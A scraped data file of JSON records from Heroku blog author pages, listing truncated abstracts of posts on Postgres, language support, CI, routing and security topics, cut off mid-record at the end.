{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Greg Nokes", "Ayori Selassie", "Greg Nokes", "Greg Nokes"], "link": "https://blog.heroku.com/authors/greg-nokes", "abstract": "Announcing Heroku Postgres Enhancements: 40x Faster Backups news January 27, 2021 Greg Nokes and Ayori Selassie Today, we’re thrilled to announce backups of Heroku Postgres are now 40x faster by leveraging Snapshots in place of base backups. We’ve been hard at work focused on improving performance, speed, and capacity for the Heroku Data services you rely on. In the past forks and follows of a Premium-8 test database with 992 GB of data took 22 hours; now with Snapshots, the same process is reduced to 10 minutes. This makes the creation of forks and followers, and restoring the database, faster than ever, at no additional charge. The New Way: Snapshots for Heroku Data In November 2020 we introduced a performance improvement to our physical backup and restore functionality for our Heroku... Read more Announcing Larger Heroku Postgres Plans: More Power, More Storage news January 21, 2021 Greg Nokes As applications become more complex, so do the data requirements to support them. At Heroku we have been working hard on enabling these workloads, while maintaining the same level of abstraction, developer experience, and compliance you’ve come to expect. Today, we’re excited to announce new, larger Heroku Postgres Plans . These new plans will allow for applications on the Heroku Platform to expand in data size and complexity. The new plans in the Heroku Postgres offering have generous resource allocations, providing the horsepower to power today’s most demanding workloads. These plans come with 768 GB of RAM, 96 Cores and up to 4TB of storage , and are available on the Common Runtime,... Read more Connection Pooling for Heroku Postgres Is Now Generally Available news January 20, 2021 Greg Nokes We are excited to announce that we are moving Connection Pooling for Heroku Postgres into GA. Connection Pooling unlocks the ability to use up to 10,000 client connections to a Heroku Postgres Database, without adversely impacting performance on the database. This will unlock more complex and higher scale applications with simpler architectures on the Heroku Platform. Over the years, one of the factors that you have to consider when scaling applications is pressure on the database. Each connection to the database consumes resources that could be spent on processing requests. The balancing of resources spent on connections and processing is a delicate one that Heroku Engineering has had... Read more", "date": "2021-01-27,"},
{"website": "Heroku", "title": null, "author": ["Email", "Garen Torikian"], "link": "https://blog.heroku.com/authors/garen-torikian", "abstract": "Building and Scaling a Global Chatbot using Heroku + Terraform engineering April 22, 2020 Garen Torikian Text-based communication has a long history weaved into the evolution of the Internet, from IRC and XMPP to Slack and Discord. And where there have been humans, there have also been chatbots: scriptable programs that respond to a user’s commands, like messages in a chat room. Chatbots don't require much in terms of computational power or disk storage, as they rely heavily on APIs to send actions and receive responses. But as with any kind of software, scaling them to support millions of user’s requests across the world requires a fail-safe operational strategy. Salesforce offers a Live Agent support product with a chatbot integration that reacts to customer inquiries. In this post,... Read more", "date": "2020-04-22,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "Fred Hebert", "Fred Hebert", "Fred Hebert", "Fred Hebert"], "link": "https://blog.heroku.com/authors/fred-hebert", "abstract": "How We Sped up SNI TLS Handshakes by 5x engineering December 22, 2016 Fred Hebert During the development of the recently released Heroku SSL feature, a lot of work was carried out to stabilize the system and improve its speed. In this post, I will explain how we managed to improve the speed of our TLS handshakes by 4-5x. The initial reports of speed issues were sent our way by beta customers who were unhappy about the low level of performance. This was understandable since, after all, we were not greenfielding a solution for which nothing existed, but actively trying to provide an alternative to the SSL Endpoint add-on, which is provided by a dedicated team working on elastic load balancers at AWS. At the same time, another of the worries we had was to figure out how... Read more Heroku Proxying becomes Free Software engineering October 20, 2015 Fred Hebert HTTP routing on Heroku is made up of three main logical layers: The state synchronization layer ensures that all nodes in the routing stack are aware of the latest changes in domains, application, and dyno locations across the platform; The routing layer chooses which dyno will handle an HTTP request ( random or sticky ), performs logging, error-reporting, and so on; The HTTP proxying layer handles the validation, normalization, and forwarding of requests between clients and dynos. This last part is the one the platform team is happy to open-source today with the Vegur library. Read more Stuff Goes Bad engineering September 16, 2014 Fred Hebert The Heroku Routing team does a lot of work with Erlang, both in terms of development and maintenance , to make sure the platform scales smoothly as it continues to grow. Over time we've learned some hard-earned lessons about making systems that can scale with some amounts of reliability (or rather, we've definitely learned what doesn't work), and about what kind of operational work we may expect to have to do in anger. This kind of knowledge usually remains embedded within the teams that develop it, and tends to die when individuals leave or change roles. When new members join the team, it gets transmitted informally, over incident simulations, code reviews, and other similar... Read more Troubleshooting Down the Logplex Rabbit Hole news November 07, 2013 Fred Hebert Adventures of a Heroku Routing Engineer My name is Fred and I spend most of my time on Logplex . Since joining Heroku in March 2013, I've become the main developer on that product and handle most of the maintenance and support that goes with it. In this post, I'll explain what the Heroku routing team needed to do to make Logplex more stable, decrease our workload, and keep our mornings quiet and productive. I'm a remote employee on the Heroku routing team, and I live on the East coast, which means I'm usually the first one in the routing room in the company's HipChat. Later, Tristan, who lives in Illinois, joins me. Then a few hours later, the rest of the team joins... Read more", "date": "2016-12-22,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Francis Lacoste"], "link": "https://blog.heroku.com/authors/francis-lacoste", "abstract": "Bringing Mindfulness to Work life March 02, 2020 Francis Lacoste Meditation, like the foundations of software, is built on top of a binary state: an inhale and an exhale, a breath in and a breath out, a one and a zero. We often believe that to engage in meditation, we need to place ourselves in a room of absolute silence, to dress in comfortable linens, and to be utterly still and alone. But this image could not be further from the truth! To meditate is to foster mindfulness, and presence is an activity that can be performed anywhere, and with others—even at work. Learning how to be mindful amongst others The Search Inside Yourself Leadership Institute —or SIYLI—is a globally recognized nonprofit that works towards making the development of leadership... Read more", "date": "2020-03-02,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Etienne Stalmans", "Etienne Stalmans"], "link": "https://blog.heroku.com/authors/etienne-stalmans", "abstract": "A Dive into Ruby CVE-2017-17405: Identifying a Vulnerability in Ruby’s FTP Implementation engineering April 06, 2018 Etienne Stalmans At Heroku we consistently monitor vulnerability feeds for new issues. Once a new vulnerability drops, we jump into action to triage and determine how our platform and customers may be affected. Part of this process involves evaluating possible attack scenarios not included in the original vulnerability report. We also spend time looking for \"adjacent\" and similar bugs in other products. The following Ruby vulnerability was identified during this process. Vulnerability Triage A vulnerability, CVE-2017-8817 , was identified in libcurl . The FTP function contained an out of bounds read when processing wildcards. As soon as the vulnerability was made public, we went through our... Read more A House of Cards: An Exploration of Security When Building Docker Containers engineering March 08, 2018 Etienne Stalmans Containers, specifically Docker, are all the rage. Most DevOps setups feature Docker somewhere in the CI pipeline. This likely means that any build environment you look at, will be using a container solution such as Docker. These build environments need to take untrusted user-supplied code and execute it. It makes sense to try and securely containerize this to minimize risk. In this post, we’re going to explore how a small misconfiguration in a build environment can create a severe security risk. It's important to note that this post does not describe any inherent vulnerability in Heroku, Docker, AWS CodeBuild, or containers in general, but discusses a misconfiguration issue that was... Read more", "date": "2018-04-06,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Edward Muller"], "link": "https://blog.heroku.com/authors/edward-muller-heroku", "abstract": "Microservices in Go using Go-kit news February 19, 2016 Edward Muller Go-kit is a distributed programming toolkit for building microservices. It solves the common problems encountered while building distributed systems, so you can focus on your business logic. This article starts with a bit of background on microservices, then guidance on how to get started with Go-kit, including instructions on getting a basic service up and running on Heroku. A Brief Intro to Microservices Traditionally, web applications are built using a monolithic approach where the entire application is built, designed, deployed and maintained as a single unit. When working with a monolithic application various problems can arise over time: it’s easy for abstractions to leak across... Read more", "date": "2016-02-19,"},
{"website": "Heroku", "title": null, "author": ["Email", "GitHub", "LinkedIn", "Ed Morley", "Casey"], "link": "https://blog.heroku.com/authors/ed-morley", "abstract": "From Project to Productionized with Python engineering June 22, 2020 Ed Morley and Casey We hope that you and your loved ones are staying safe from the COVID-19 pandemic. As a result of its effect on large gatherings, PyCon 2020 was cancelled changed to an online event . Although not being able to gather in person was disheartening for organizers, speakers, and attendees, the Python community shared virtual high-fives and hugs with PyCon US 2020 Online. We recorded our planned Heroku workshop for the event , on which this blog post is based. Casey Faist: Hi, I'm Casey Faist the queen Pythonista at Heroku and this is From Project to Productionized on Heroku. Now, I wish we could be together today. I wish we could be swapping stories and coding together. I wish we could... Read more", "date": "2020-06-22,"},
{"website": "Heroku", "title": null, "author": ["Dominic Dagradi"], "link": "https://blog.heroku.com/authors/dominic-dagradi", "abstract": "Introducing Notification Center news June 14, 2013 Dominic Dagradi Change is a constant. At Heroku, we often deliver important information to users about changes and events on the platform, their apps and their accounts. We use a variety of media to keep users informed about these changes, including email, Twitter , the changelog and the blog . To help provide more direct and relevant information, we've added a new feature to Dashboard called Notification Center. We'll be using the Notification Center to keep you informed of important events affecting you and your apps. When new notifications arrive, you'll see a badge in Dashboard's header. If you log in today, you'll see something that looks like this: We'll be carefully curating... Read more", "date": "2013-06-14,"},
{"website": "Heroku", "title": null, "author": ["D. Keith Robinson"], "link": "https://blog.heroku.com/authors/d-keith-robinson", "abstract": "A Tour of Dashboard news July 31, 2013 D. Keith Robinson When you sign into Heroku from your browser, you’re in the Heroku Dashboard . Dashboard is a personalized, interactive command center for all of your apps on Heroku. It provides simple visibility and management for app status, activity, resources, add-ons, collaborators, and other critical aspects of your app. You can also use it to manage all information about your Heroku account – from SSH keys to past invoices. In this post, we take a quick tour through Dashboard and some of its recent new features, including production check and notifications. Everything About Your Apps The first thing you'll see when you log in to Dashboard is the Apps page. Here, you can see a full list of all... Read more", "date": "2013-07-31,"},
{"website": "Heroku", "title": null, "author": ["DeVaris Brown"], "link": "https://blog.heroku.com/authors/devaris-brown", "abstract": "Heroku CI Updates: Parallel Tests, CI API, and Automated UAT news September 12, 2018 DeVaris Brown Since we introduced Heroku CI over a year ago, we've been hard at work developing features aimed at making your testing speed even faster and workflow more optimized. Today we are pleased to announce Heroku CI Parallel Test Runs and the Heroku CI API are now generally available (GA) for all Heroku customers. Parallel Test Runs allows you to split up and execute test runs on up to 16 nodes. With the Heroku CI API, you can create, trigger, and receive test run info from your own custom workflow or CD tools. Additionally, we are opening up our support for cross-browser UAT via integration with third-party providers to private beta participants. Need for Speed As applications grow and... Read more", "date": "2018-09-12,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "David Zuelke", "David Zuelke"], "link": "https://blog.heroku.com/authors/david-zuelke", "abstract": "50% and Counting: PHP 7 Takes Off news December 15, 2015 David Zuelke A year and half ago, we launched support for PHP on Heroku , built from the ground up with modern features designed to give developers a more elegant and productive experience on the platform. Last week, we made PHP 7 available on top of a new, reworked version of our PHP support, and our users are adopting PHP 7’s exciting new features and stellar performance improvements quickly—we’re already seeing PHP 7 being used in the majority of PHP deploys on Heroku. Under the hood, much of the logic that handles a deploy has changed, but not the fundamental principles upon which our support for PHP applications is designed. We've always been determined to provide a fully standards-based... Read more PHP – a look back, a look forward news April 29, 2014 David Zuelke The history of PHP is the history of the web. Long-time developers will remember how PHP changed the universe of web development. PHP brought two key innovations to the table when it first launched. First, it was interpreted, which meant you could edit a file in place, then refresh the page and see the result. This quick feedback loop was why so many started with PHP and is still a cornerstone of what makes the language so useful. Second, it was the first widespread templating language which enabled intermixing of HTML and PHP code. Every other major web language and framework since PHP has followed suit. Over time, PHP became a cornerstone of the “LAMP stack”. The LAMP stack consisted of... Read more", "date": "2015-12-15,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura"], "link": "https://blog.heroku.com/authors/david-routen", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more", "date": "2020-06-29,"},
{"website": "Heroku", "title": null, "author": ["David Gouldin", "David Gouldin"], "link": "https://blog.heroku.com/authors/david-gouldin", "abstract": "Django and Node together on Heroku engineering October 28, 2014 David Gouldin Heroku Connect is written primarily in Python using Django. It's an add-on and a platform app, meaning it's built on the Heroku platform. Part of our interface provides users with a realtime dashboard, so we decided to take advantage of socket.io and node.js for websocket communication. But like all Heroku apps, only one type of dyno can serve traffic. This left us with two choices: manage 2 apps, each with its own repo, and carefully consider when and how we deployed them, or find a way to serve both node and Django traffic from the same app. Read more Securing Celery on Heroku engineering September 14, 2014 David Gouldin Celery is by far the most popular library in Python for distributing asynchronous work using a task queue. If you're building a Python web app, chances are you already use it to send email, perform API integrations, etc. Many people choose Redis as their message broker of choice because it's dead simple to set up: provision a Redis add-on, use its environment variable as your BROKER_URL , and you're done. But the simplicity of Redis comes at a cost. Redis does not currently support SSL , and it doesn't seem like that's going to change any time soon . Because Heroku add-ons communicate over the public web, that means the contents of Celery jobs are traveling unencrypted... Read more", "date": "2014-10-28,"},
{"website": "Heroku", "title": null, "author": ["David Baliles", "David Baliles"], "link": "https://blog.heroku.com/authors/david-baliles", "abstract": "Upgrading to the Heroku Toolbelt news October 15, 2012 David Baliles Heroku Toolbelt The original version of the Heroku command-line tool was available as a Ruby gem. This made it easy to install on all platforms with just one command: gem install heroku . While we love this simplicity, it depends on a system install of Rubygems. To get this experience on widely varying development environments, we created the Heroku Toolbelt , a one-click installer for every major platform. Going forward we will be sunsetting support for the heroku gem in favor of the Toolbelt. If you're already using the Toolbelt, you're fine to stop reading now. To verify whether you're using the gem or Toolbelt, use heroku version : $ heroku version heroku-toolbelt/2.32.11... Read more Using Bundler Groups on Heroku news February 15, 2011 David Baliles Bundler groups are commonly used to specify which dependencies of your application are needed in a given environment. You may have something like this in your Gemfile: group :test do gem \"rspec\" end Using the \"test\" group in this case allows you to specify the gems that are needed to test your application. Since you won’t need these gems in production, you can speed up installation by ignoring the \"test\" group. Bundler provides this ability through the --without option: bundle install --without test You can currently access this functionality on Heroku by setting the BUNDLE_WITHOUT config var in your application. Starting today we are going to default BUNDLE_WITHOUT to ... Read more", "date": "2012-10-15,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Danielle Adams", "Danielle Adams"], "link": "https://blog.heroku.com/authors/danielle", "abstract": "Building a Monorepo with Yarn 2 engineering December 22, 2020 Danielle Adams In true JavaScript fashion, there was no shortage of releases in the JavaScript ecosystem this year. This includes the Yarn project’s release of Yarn 2 with a compressed cache of JavaScript dependencies, including a Yarn binary to reference, that can be used for a zero-install deployment. Yarn is a package manager that also provides developers a project management toolset. Now, Yarn 2 is now officially supported by Heroku, and Heroku developers are able to take advantage of leveraging zero-installs during their Node.js builds. We’ll go over a popular use case for Yarn that is enhanced by Yarn 2: using workspaces to manage dependencies for your monorepo. We will cover taking advantage of... Read more Celebrating 25 Years of JavaScript life December 04, 2020 Danielle Adams JavaScript turns 25 years old today. While it’s made an impact on my career as a developer, it has also impacted many developers like me and users around the world. To commemorate our favorite language, we’ve collected 25 landmark events that have shaped the path of what the JavaScript ecosystem looks like today. 1995 1) JavaScript is created In 1995, Brendan Eich, a developer at Netscape, known for their Netscape browser, was tasked with building a client-side scripting language that paired well with Java. While it may not be the language that you know and love today, JavaScript was written in 10 days with features we still use today, such as first-class functions. 1997 2)... Read more", "date": "2020-12-22,"},
{"website": "Heroku", "title": null, "author": ["Dana Oshiro"], "link": "https://blog.heroku.com/authors/dana-oshiro", "abstract": "Waza 2013: How Ecosystems Build Mastery news March 20, 2013 Dana Oshiro When we think of the concept of Waza (技) or \"art and technique,\" it's easy to get caught up in the idea of individual mastery. It's true that works of art are often created by those with great skill, but acquiring that skill is neither solitary nor static. Generations of masters contribute to a canon and it is in that spirit that we built the Heroku platform and the Waza event. This year's Waza was no exception. On February 28th, more than 900 attendees participated in Waza including Ruby founder Yukihiro \"Matz\" Matsumoto , Django co-creator Jacob Kaplan-Moss and Codeacademy’s Linda Liukas . True to form, we offered you a platform for experimentation and... Read more", "date": "2013-03-20,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Damien Mathieu", "Damien Mathieu", "Damien Mathieu", "Damien Mathieu"], "link": "https://blog.heroku.com/authors/damien-mathieu", "abstract": "How I Broke `git push heroku main` engineering October 01, 2020 Damien Mathieu Incidents are inevitable. Any platform, large or small will have them. While resiliency work will definitely be an important factor in reducing the number of incidents, hoping to remove all of them (and therefore reach 100% uptime) is not an achievable goal. We should, however, learn as much as we can from incidents, so we can avoid repeating them. In this post, we will look at one of those incidents, #2105 , see how it happened (spoiler: I messed up), and what we’re doing to avoid it from happening again (spoiler: I’m not fired). Read more Dissecting Kubernetes Deployments engineering February 22, 2018 Damien Mathieu Kubernetes is a container orchestration system that originated at Google, and is now being maintained by the Cloud Native Computing Foundation . In this post, I am going to dissect some Kubernetes internals—especially, Deployments and how gradual rollouts of new containers are handled. What Is a Deployment? This is how the Kubernetes documentation describes Deployments: A Deployment controller provides declarative updates for Pods and ReplicaSets. A Pod is a group of one or more containers which can be started inside a cluster. A pod started manually is not going to be very useful though, as it won't automatically be restarted if it crashes. A ReplicaSet ensures that a Pod... Read more Simulate Third-Party Downtime engineering February 29, 2016 Damien Mathieu I spend most of my time at Heroku working on our support tools and services; help.heroku.com is one such example. Heroku's help application depends on the Platform API to, amongst other things, authenticate users, authorize or deny access, and fetch user data. So, what happens to tools and services like help.heroku.com during a platform incident? They must remain available to both agents and customers—regardless of the status of the Platform API. There is simply no substitute for communication during an outage. To ensure this is the case, we use api-maintenance-sim , an app we recently open-sourced, to regularly simulate Platform API incidents. Simulating downtime During a Platform... Read more Time Out Quickly engineering December 04, 2014 Damien Mathieu Working with our support team, I often see customers having timeout problems. Typically, their applications will start throwing H12 errors. The decision to timeout requests quickly wasn't made to avoid having long-running requests on our router, nor to only have fast apps on our platform, but because standard web servers do not handle these types of requests particularly well. Read more", "date": "2020-10-01,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Craig Ingram"], "link": "https://blog.heroku.com/authors/craig-ingram", "abstract": "Securing Dependencies for Rails 5.2 Active Storage engineering May 22, 2018 Craig Ingram The Public Cloud Security (PCS) group at Salesforce partners very closely with Heroku engineering to review and advise on new product features across the platform, from infrastructure to applications. One of the most rewarding aspects about this partnership and working on this team for me is when we not only identify security concerns, but take an active role in building safe solutions. Heroku recently announced support for Active Storage in Rails 5.2, which introduces the ability to generate previews of PDFs and videos. As a security engineer, hearing about a new feature in a product that automatically parses media files definitely grabbed my attention. This post takes a look at... Read more", "date": "2018-05-22,"},
{"website": "Heroku", "title": null, "author": ["Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens", "Craig Kerstiens"], "link": "https://blog.heroku.com/authors/craig-kerstiens", "abstract": "Go support now official on Heroku news July 07, 2015 Craig Kerstiens Today, we're excited to introduce Go as the newest officially supported language on Heroku. Over the last 2 years we’ve fallen in love with Go, an expressive, concise, clean, and efficient language with built-in concurrency, making it easy to write and maintain network services, microservices and high-traffic API endpoints. Now when writing Go you can leverage Heroku’s great developer experience and platform to quickly build apps your users can depend on. This includes the familiar git push heroku master , review apps , metrics within your dashboard , and much more. As you'd expect, Heroku doesn't introduce any changes to your Go application runtime or dependencies. Your code is... Read more Introducing Session Affinity news April 28, 2015 Craig Kerstiens Today we’re excited to announce public beta support for HTTP session affinity, a feature that makes building real-time applications easier than ever. Session affinity improves end user experience in certain types of applications and architectures where you require some level of extra state within your application code, because it ensures related requests get routed to the same instance of your code. This improves performance reducing the need to go and get the needed state for a specific user. At high level, here's how it works: When you enable session affinity on your application, the Heroku router will set a special cookie on every HTTP request. This cookie will allow our routing... Read more Announcing Heroku Elements – The Marketplace for the Builders of the App Economy news April 16, 2015 Craig Kerstiens These days, apps are more composed than built. Long past are the days of spinning up your own Elasticsearch cluster to add search to your application. Instead we borrow from previous projects, and adapt a template as a good foundation. It’s a great improvement – but the process of keeping up to date with the right services, tools, and templates can be a time consuming task at best, and an overwhelming flood of new information at worst. Today we're excited to announce Heroku Elements, a new marketplace that brings all of the pieces within our Heroku ecosystem together in one place. It’s a simpler way to discover and select the best components to build apps fast. In a nutshell, Heroku... Read more Making CLI Plug-ins Better with a New Architecture news March 19, 2015 Craig Kerstiens At Heroku, most of us love living in the CLI. Of course, we're absolutely dedicated to providing a great developer experience whether it’s in the dashboard or at the terminal, but we also believe a mastery of the command line interface offers great productivity to you as a developer. A well designed CLI coupled with other small sharp Linux tools provide primitives to build powerful productivity. Today we're introducing an exciting new foundation for the Heroku CLI – an entirely rebuilt plug-in architecture. This new plug-in infrastructure lays the groundwork for extending the power of the CLI, letting you be more productive than ever before. Want to know if your app is production... Read more Expanding the Power of Add-ons news January 23, 2015 Craig Kerstiens In a world where microservices continue to grow , offering better agility for iterating quickly, many of the tools you use in building applications must adapt. Microservices bring together challenges in a variety of ways for the services you consume – logging and monitoring tools now need a broader perspective than that of a single app, data services may be shared either for reporting or direct access to data. Heroku has been on the forefront of creating a developer tools add-ons ecosystem that lets you focus on building your app by grabbing the service you need off the shelf. Today, the Heroku platform is becoming even more powerful with add-on sharing – a new feature for composing... Read more Heroku at the Salesforce Hackathon news October 02, 2014 Craig Kerstiens As part of Salesforce’s Dreamforce conference, Salesforce is hosting its second major hackathon on October 10-12 in San Francisco . The format for this year’s hackathon has been expanded to include specific categories for not just Heroku, but also some of our favorite open source projects. With over ten prizes of more than $10,000 each, this is a great opportunity to build something cool, take advantage of some of the latest Heroku features , and help your favorite open source projects. Heroku Category Heroku has long focused on helping you build apps. In looking at the data we have on the over 5 billion requests Heroku serves each day, the percentage coming from mobile devices has grown... Read more Welcome to Heroku, CloudBees developers news September 12, 2014 Craig Kerstiens The key to any startup is focus -- focusing in multiple directions is really no focus at all. Following this premise we understand the decision by CloudBees to double down on their continuous integration offering of Jenkins, and to discontinue their platform as a service product. Continuous integration is already playing an important role in application development and deployment and will only continue to grow in the future. Many of us are fans of Jenkins, and in fact we have many Heroku customers today taking advantage of Jenkins and other CI services . We’re also pleased to see CloudBees suggest that users migrate their PaaS services to providers like Heroku , and we’d like to welcome... Read more The new PHP on Heroku now Generally Available news July 15, 2014 Craig Kerstiens Today we’re announcing the general availability of the new PHP support on Heroku . The key features, in case you missed them when we outlined them in the beta announcement, include: New modern runtimes in HipHop VM Packaging and first class frameworks Heroku XL support for large scale enterprise apps We’re very happy to make this generally available for all users. Since our public beta weeks ago we’ve seen a variety of users trying many of these modern frameworks such as Laravel and Symfony , as well as work towards improving the development experience by running our own buildpack locally . In addition to all of the above which was available at the public beta, we’ve improved our PHP... Read more Introducing the new PHP on Heroku news April 29, 2014 Craig Kerstiens PHP developers are makers at heart. The core strength of PHP has always been in creating a tight feedback cycle between developers and their audiences. That strength is the reason why PHP powers so many of the world’s biggest and best web properties such as Facebook and Etsy. But as developers of those and similar apps know, PHP hasn’t always enjoyed some of the runtime, management or infrastructure elements its peer communities like Ruby on Rails, Python with Django, and Node have had for some time. As one of the web’s largest PHP shops, Facebook has been an advocate and innovator for the language, but it’s been hard for PHP developers beyond Facebook’s walls to take advantage of that... Read more OpenSSL Heartbleed Security Update news April 08, 2014 Craig Kerstiens Yesterday the OpenSSL Project released an update to address the CVE-2014-0160 vulnerability , nicknamed “Heartbleed.” This serious vulnerability affects a substantial number of applications and services running on the internet, including Heroku. All Heroku users should update their passwords as a precautionary measure. If you are currently running the SSL Endpoint add-on, you should re-key and reissue your certificate and update it as it may have been exposed. As of Tuesday, April 8 at 15:55 UTC, all Heroku certificates, infrastructure, and Heroku Postgres have been updated and are no longer vulnerable. Continue reading for further details on each affected vector. Vulnerability Details ... Read more Hacking Hack on Heroku news March 21, 2014 Craig Kerstiens Anytime a new language comes out it’s fun to immediately download it and give it a try . Yesterday Facebook announced Hack , a programming language they developed for HHVM which interoperates seamlessly with PHP . Facebook itself is already running on Hack, and it looks to deliver some exciting improvements from its PHP influence, we thought we’d make it a bit easier for you to run your own apps on Hack by working with them to create a Heroku buildpack . To highlight a few of the awesome things about Hack: Many PHP files are already valid Hack, so you can just start with an existing PHP project Gradual typing, which lets dynamic and statically typed code play well together More language... Read more Connection Limit Guidance news November 22, 2013 Craig Kerstiens Many of our customers have recently asked about our connection limit settings on our new Heroku Postgres tiers. Previously we allowed for 500 connections across all production databases, however now there is some variance in the number of connections allowed with only the larger plans offering 500. In individual conversations with customers we’ve detailed the reasoning behind this, and feel its worth sharing this more broadly here now. For some initial background, our connection limit updates are actually aimed to be an improvement for anyone running a Heroku Postgres database, by both providing some guidelines as well as setting some expectations around what a database instance is... Read more Welcome to the Community news November 14, 2013 Craig Kerstiens At Heroku we have long considered PostgreSQL to be a powerful and reliable open-source database for keeping data safe and accessible for serious applications with demanding workflows and use cases. Over the years we’ve invested heavily in continuing to improve it , whether it’s by employing Postgres major contibutors , employing driver maintainers , funding core development, or being part of language communites such as Ruby and Python to help spread the good news that is Postgres. It’s that interaction with the developer and database communities that help us inform and influence the future of Postgres. This work over the years has continued to advance Postgres to be a better database for... Read more Introducing Heroku Postgres 2.0 news November 11, 2013 Craig Kerstiens Today we're excited to announce an evolution of what it means to be a database as a service provider. Along with new features such as the ability to roll back your database to an arbitrary point in time and high availability, we now provide an entirely new level of operational expertise that's built right in. This new level of service allows you to feel at ease while taking advantage of your database in ways you never expected. All of this is rolled into new tiers which make it as easy as ever to choose what’s right for you. We are introducing Heroku Postgres 2.0 today, the result of these improvements. Let's dig in a little further on what's available today. Operational... Read more PostgreSQL 9.3 now GA on Heroku Postgres news November 06, 2013 Craig Kerstiens Several weeks ago we added support for Postgres 9.3 in public beta the day it was released to the community. We've had many customers use it so far and it has proven to be robust and reliable. Early adopters have started to take advantage of the great new features in this version including: New JSON functions and operators Foreign data wrappers And more Today we're excited to release Postgres 9.3 in General Availability and setting it as the default version when provisioning a new Heroku Postgres database. Defaulting to the latest version of Postgres ensures our customers can make use of the latest features and performance improvements available. If you haven’t upgraded to take... Read more Monitoring your Heroku Postgres Database news October 16, 2013 Craig Kerstiens There are two axes of database monitoring. One axis is immediate insight. You can see what is happening right now, getting just-in-time visibility to solve problems and observe production behavior as it happens. The other axis is historical monitoring. This provides long-term persistence and reporting on the most important metrics over time, helping you make better decisions and understand trends. With Heroku Postgres, you can get immediate insight with the pg-extras CLI plugin. Furthermore, we provide key metrics about your database right in your logs already for all applications. For storage and reporting of your most important metrics, you can quickly set up rich historical reporting... Read more WAL-E and Continuous Protection with Heroku Postgres news September 26, 2013 Craig Kerstiens Heroku Postgres is Heroku’s database-as-a-service product. With Heroku Postgres, you can easily provision and scale a Postgres database for your Heroku application, or as a stand-alone service. Recently, we’ve blogged about PostgreSQL 9.3 on Heroku and how you can use Heroku Postgres dataclips to build awesome business dashboards with your data. In this post, we talk about how Heroku Postgres delivers continuous protection for your business data using WAL-E, an open source application for archiving PostgreSQL WAL (Write Ahead Log) files quickly, continuously and with a low operational burden. About Continuous Protection In order to protect customer data and be resilient to failure... Read more Introducing Postgres 9.3 news September 09, 2013 Craig Kerstiens As of today PostgreSQL 9.3 is available on Heroku Postgres as a public beta. This new version of Postgres brings you even more useful features so you can be as powerful as ever. Whether its richer JSON functionality , materialized views , or richer join support in lateral joins this version has a little something for everyone. Provision your Postgres 9.3 database by running heroku addons:add heroku-postgresql:crane --version=9.3 and get started working with it today, or check out some of our favorite features included in this new version below. Foreign Tables Foreign data wrappers (FDWs), which allow you to query from within Postgres to an external datasource, have been available for a... Read more Win a ticket to Postgres Open and visit us there news August 26, 2013 Craig Kerstiens The Heroku Postgres team is hitting the road in coming months and we'd love to connect with you. If you'd like to connect with us at any of the events below drop us a line postgres@heroku.com or @HerokuPostgres Postgres Open The first opportunity to connect with us is in September at Postgres Open . If you've already got your tickets for Postgres Open join us for drinks and/or pizza at Clark Ale House on Tuesday September 17, and make sure to check out talks by me and Peter Geoghegan at the conference. If you don't already have your ticket for Postgres Open but are interested in going, we've got a chance for you to win a ticket from us for free. Win a ticket to... Read more JavaScript in your Postgres news June 05, 2013 Craig Kerstiens The same JavaScript engine that powers the web today is now available in your database. This is one more step in evolving a data platform to meet all of your data needs. With a key/value store inside Postgres you gained agility in working with your schema. This agility was further improved with the JSON data type in Postgres 9.2. With geospatial support you removed the need for relying on additional tools for building location based apps. And today we're continuing to expand, going beyond SQL bringing the full power of the V8 JavaScript engine to your Heroku Postgres database. This offering is available immediately in public beta on all production tier databases . More on V8 V8 is a... Read more Postgres 9.3 Beta Available news May 15, 2013 Craig Kerstiens With each new release, Postgres brings new powerful functionality to your fingertips – Postgres 9.3 is shaping up to be no different. Postgres 9.3 will include richer JSON operators for the JSON datatype , SQL-standard LATERAL subquery support , materialized views , and of course much more. Postgres 9.3 Beta was made available earlier this week and we’re excited to announce a public alpha of it ourselves. You can get started immediately with the alpha today by provisioning a Postgres 9.3 database on our production tier : $ heroku addons:add heroku-postgresql:crane --version=9.3 ... Use `heroku pg:wait` to track status. ! WARNING: Postgres 9.3 is in alpha. alpha releases have ! a higher risk... Read more Database Insight with pg-extras news May 10, 2013 Craig Kerstiens When building your application there's a lot to worry about, from choice of 